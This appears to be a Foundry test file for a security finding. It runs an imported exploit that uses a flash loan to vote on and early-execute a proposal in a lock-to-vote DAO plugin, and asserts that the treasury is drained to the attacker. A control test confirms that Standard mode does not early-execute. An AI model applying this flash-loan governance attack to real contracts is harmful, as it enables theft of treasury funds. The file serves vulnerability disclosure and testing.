// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {
    Exploit,
    LockToVotePlugin,
    FlashVoter,
    MockToken
} from "./62256-proposals-created-with-voting-mode-earlyexecution-are-vulner.sol";

contract EarlyExecutionFlashloanTest is Test {
    function test_flashloanEarlyExecute_drainsTreasury() public {
        Exploit e = new Exploit();
        e.run();

        assertTrue(e.plugin().isExecuted(e.proposalId()), "executed");
        assertEq(e.reward().balanceOf(address(e.voter())), 5 ether, "pot to voter");
        assertEq(e.reward().balanceOf(address(e.treasury())), 0, "treasury empty");
        assertEq(e.plugin().locked(address(e.voter())), 0, "no lock left");
    }

    /// @dev Control: Standard mode does NOT early-execute in the same vote tx.
    function test_standardMode_doesNotEarlyExecute() public {
        Exploit e = new Exploit();
        LockToVotePlugin plugin = e.plugin();
        MockToken reward = e.reward();
        // create Standard proposal with same payout
        bytes memory data = abi.encodeWithSelector(
            bytes4(keccak256("payout(address,uint256)")), address(e.voter()), 5 ether
        );
        // mint another pot into treasury for this proposal
        reward.mint(address(e.treasury()), 5 ether);

        uint256 id = plugin.createProposal(
            LockToVotePlugin.VotingMode.Standard, 5000, 1, address(e.treasury()), data
        );

        // flashloan vote path still locks+votes, but should NOT execute
        // Use a fresh FlashVoter against standard proposal
        // Direct: lock tokens via mint + lockAndVote without expecting execute
        MockToken lockToken = e.lockToken();
        lockToken.mint(address(this), 10 ether);
        lockToken.approve(address(plugin), 10 ether);
        // call lockAndVote — Standard mode has no early execute branch
        // We need VoteOption.Yes = 2
        // Use low-level to avoid importing enum
        (bool ok,) = address(plugin).call(
            abi.encodeWithSignature("lockAndVote(uint256,uint8,uint256)", id, uint8(2), 10 ether)
        );
        assertTrue(ok, "vote ok");
        assertFalse(plugin.isExecuted(id), "Standard must not early-execute");
    }
}
